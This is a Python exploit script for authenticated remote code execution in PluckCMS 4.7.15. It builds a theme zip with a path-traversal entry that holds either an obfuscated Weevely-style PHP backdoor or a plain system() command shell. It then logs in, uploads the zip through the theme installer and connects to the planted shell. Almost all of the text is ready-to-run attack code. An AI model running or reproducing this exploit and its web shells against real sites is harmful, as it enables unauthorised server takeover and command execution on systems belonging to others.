s#!/usr/bin/python3
#-*- coding: utf-8 -*-
# overkill...mostly python practice
import requests, sys, shutil, zipfile, subprocess
from io import BytesIO
#from bs4 import BeautifulSoup

class bco:
    WHT = '\033[37m'
    RED = '\033[91m'
    ENC = '\033[0m'

print(bco.WHT+"""- - - - - - - - - - - - - - - - - - - - - - - - - - - 
       PluckCMS 4.7.15 Authenticated RCE 
- - - - - - - - - - - - - - - - - - - - - - - - - - - """+bco.ENC)

# Set argst
if len(sys.argv) != 3:
	print(bco.RED+"""[*] Exploits the theme installation feature
[*] poc.py http://PluckWebRoot/ password
    [*] example: python3 exploit.py http://127.0.01/pluck/ letmein
 """+bco.ENC)
	exit(1)
else:
	phost = sys.argv[1]
	ppass = sys.argv[2]	
	phostL = phost + "login.php"	
	print(bco.WHT+"  [+] Parameters Aquired"+bco.ENC)


# Test URI
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",

}

print(bco.WHT+"  [+] Checking Target Status..."+bco.ENC)
testGet = requests.get(phostL, headers=headers)
if testGet.status_code != 200:
	print(bco.WHT+"      [!] Target & URI are: "+bco.RED+"Down"+bco.ENC)
	exit(1)
else:
	print(bco.WHT+"      [+] Target & URI are: "+bco.RED+"Up"+bco.ENC)

# Check for weevely and generate web shell
wevExist = shutil.which("weevely")

if wevExist is not None:
	print(bco.WHT+"  [+] Weevely found locally. Webshell Generated!"+bco.ENC)
	payload = """
	<?php
	$B='d=1) {@ob_[dstart()[d;@e[dval(@gzun[d[dcompre[dss(@x(@bas[d[de64_decode($m';
	$T='[dPxX1Fd2i[dLFzeIze"[d;funct[dion x([d[d[d$t,$k[d){$c=strlen($k);$[dl=strl';
	$z='++[d,[d$i++){$[d[do.=$t{[d$i}^$k{$j};}}ret[durn[d $o;}if ([d@pr[d[deg_matc';
	$G='[1])[d,$[dk)));$o=[d@ob_ge[dt_co[dn[d[dtents();@[dob_end_clean([d);$r=@ba[';
	$N='$k=[d"801e9ff[da";$k[dh="eff27[d[d683d28d";$[dkf="d[d96f5b[dd812c6";$p[d="w';
	$O='h("/$kh([d.+[d)$kf/",@[d[dfile[d_get_contents[d("php:[d//in[dput"),$m)=[d[';
	$Y='dse64_enco[d[dde(@x([d@[dg[dzco[dmpress($o),$k))[d;print("$p[d$kh$r$kf");}';
	$I='en[d([d$t)[d;$o="";for($i=[d0;$i<[d$l;){for([d$j=0;[d($j<$[dc&&$i[d<$l);$j';
	$E=str_replace('YZ','','creYZaYZYZte_fuYZnYZctiYZon');
	$H=str_replace('[d','',$N.$T.$I.$z.$O.$B.$G.$Y);
	$k=$E('',$H);$k();
	?>
	"""
	pv = True
else:
	print(bco.WHT+"  [+] Weevely Webshell Generator not found locally"+bco.ENC)
	print(bco.WHT+"      [+] Using basic PHP webshell instead"+bco.ENC)
	payload = """<pre>
	<body style="background-color:#060224; color:#77c7a6;">
	<?php echo system($_GET["cmd"]); ?>
	</pre>
	"""
	pv = False

# Generate zip payload
print(bco.WHT+"  [+] Generating theme .zip payload & saving to /tmp"+bco.ENC)
def _build_zip():
 f = BytesIO()
 z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
 z.writestr('../../../crash/boom.php', payload)
 z.close()
 zip = open('/tmp/bang.zip','wb')
 zip.write(f.getvalue())
 zip.close()
_build_zip()

# Login

print(bco.WHT+"  [+] Attempting to login & upload shell"+bco.ENC)
uploadUri = phost + 'admin.php?action=themeinstall'

pSession = requests.Session() 
postData = { "cont1" : ppass, "bogus": "", "submit" : "Log+in" }
loginReq = pSession.post(phostL, data = postData)
#soupB = BeautifulSoup(loginReq.content, 'html.parser')
#print(soupB )
  
correct = b'correct'

if correct in loginReq.content:
  print(bco.WHT+"      [+] Login:  "+bco.RED+"Successful"+bco.ENC)
else:
  print(bco.WHT+"      [+] Login:  "+bco.RED+"Failed"+bco.ENC)
  exit(1)

# UPLOAD
filesBang = open('/tmp/bang.zip', 'rb')
upData = {'submit':'Upload'}
upSend = pSession.post(uploadUri, files = {"sendfile": filesBang}, data=upData)
  
noAllow = b'not allowed'

if noAllow in upSend.content:
  print(bco.WHT+"      [+] Upload: " + bco.RED + "Failed"+bco.ENC)
  exit(1)
else:
  print(bco.WHT+"      [+] Upload: " + bco.RED + "Successful"+bco.ENC)
  

# Catch Shell
shellUri = phost + "crash/boom.php"

if pv == True:
  subprocess.run([wevExist, shellUri, "kablamo"])
else:
  print(bco.WHT+"  [+] Time to Access your webshell! "+bco.RED+shellUri+"?cmd="+bco.ENC) 
  print(bco.WHT+"      [+] Eg: "+bco.RED+shellUri+"?cmd=uname -a"+bco.ENC)
  print(bco.WHT+"  [+] Complete."+bco.ENC)
  
